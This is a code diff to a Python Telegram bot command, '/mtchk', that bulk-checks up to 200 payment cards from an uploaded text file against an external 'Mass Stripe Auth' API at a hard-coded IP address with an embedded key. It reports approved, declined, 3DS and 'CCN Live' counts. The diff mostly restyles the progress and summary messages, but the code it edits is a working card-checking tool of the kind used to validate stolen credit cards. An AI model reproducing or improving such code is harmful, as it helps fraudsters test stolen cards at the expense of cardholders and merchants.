@@ -1407,16 +1407,16 @@ from telegram.ext import ContextTypes
 
 API_URL = "http://31.97.66.195:8000/?key=k4linuxx&card={}"
 MAX_CARDS = 200
-DELAY_BETWEEN_REQUESTS = 1  # seconds between checks (to avoid API flood)
+DELAY_BETWEEN_REQUESTS = 1  # seconds between requests (to avoid API flood)
 
 
 async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     /mtchk → Checks up to 200 cards from a .txt file via API.
-    Shows animated progress bar and returns a modified file with results + summary.
+    Shows stylish animated progress bar and returns a modified file with results + summary.
     """
 
-    # Handle reply to a txt file OR direct txt upload
+    # Handle file upload / reply to txt
     if update.message.reply_to_message and update.message.reply_to_message.document:
         file = await update.message.reply_to_message.document.get_file()
     elif update.message.document:
@@ -1439,11 +1439,15 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     results = []
     approved = declined = threed = live = 0
 
-    # Initial animated progress bar
+    # Initial progress box
     progress_msg = await update.message.reply_text(
-        "🔍 **Checking cards...**\n\n"
-        "`[░░░░░░░░░░░░░░░░░░░░] 0%`\n\n"
-        "🌐 Gateway: **Mass Stripe Auth**",
+        "╭━━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        "┃ 🔍 Checking cards...  ┃\n"
+        "┃                       ┃\n"
+        "┃ [░░░░░░░░░░░░░░░░░░░░] 0% ┃\n"
+        "┃                       ┃\n"
+        "┃ 🌐 Gateway: Mass Stripe Auth\n"
+        "╰━━━━━━━━━━━━━━━━━━━━━━━╯",
         parse_mode="Markdown"
     )
 
@@ -1473,7 +1477,7 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception:
                 results.append(f"{card} => Error ❌")
 
-            # Animate progress bar
+            # Animate fancy box progress
             percent = int((i / len(lines)) * 100)
             bar_length = 20
             filled = int(bar_length * percent // 100)
@@ -1481,10 +1485,13 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             try:
                 await progress_msg.edit_text(
-                    f"🔍 **Checking cards...**\n\n"
-                    f"`[{bar}] {percent}%`\n\n"
-                    "🌐 Gateway: **Mass Stripe Auth**",
-                    parse_mode="Markdown"
+                    "╭━━━━━━━━━━━━╮\n"
+                    "┃ 🔍 Checking cards...  \n"
+                    "┃                       \n"
+                    f"┃ [{bar}] {percent}% ┃\n"
+                    "┃                       ┃\n"
+                    "┃ 🌐 Gateway: Mass Stripe Auth\n"
+                    "╰━━━━━━━━━━━━━━━━━━━━━━━╯"
                 )
             except:
                 pass
@@ -1495,19 +1502,19 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with open("checked_cards.txt", "w", encoding="utf-8") as f:
         f.write("\n".join(results))
 
-    # Summary for caption
+    # Summary under file
     summary = (
-        "━━━━━━━━━━━━━━━━━━\n"
-        "🌐 Gateway   = Mass Stripe Auth\n"
-        f"📊 Checked   = {len(lines)}\n"
-        f"✅ Approved  = {approved}\n"
-        f"❌ Declined  = {declined}\n"
-        f"⚠️ 3DS       = {threed}\n"
-        f"💳 CCN Live  = {live}\n"
-        "━━━━━━━━━━━━━━━━━━"
+        "╭━━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        "┃ 🌐 Gateway   = Mass Stripe Auth\n"
+        f"┃ 📊 Checked   = {len(lines)}\n"
+        f"┃ ✅ Approved  = {approved}\n"
+        f"┃ ❌ Declined  = {declined}\n"
+        f"┃ ⚠️ 3DS       = {threed}\n"
+        f"┃ 💳 CCN Live  = {live}\n"
+        "╰━━━━━━━━━━━━━━━━━━━━━━━╯"
     )
 
-    # Final file send with summary as caption
+    # Send file + summary
     await update.message.reply_document(
         document=InputFile("checked_cards.txt"),
         caption=summary
@@ -1518,8 +1525,6 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await progress_msg.delete()
     except:
         pass
-
-
 
 
 
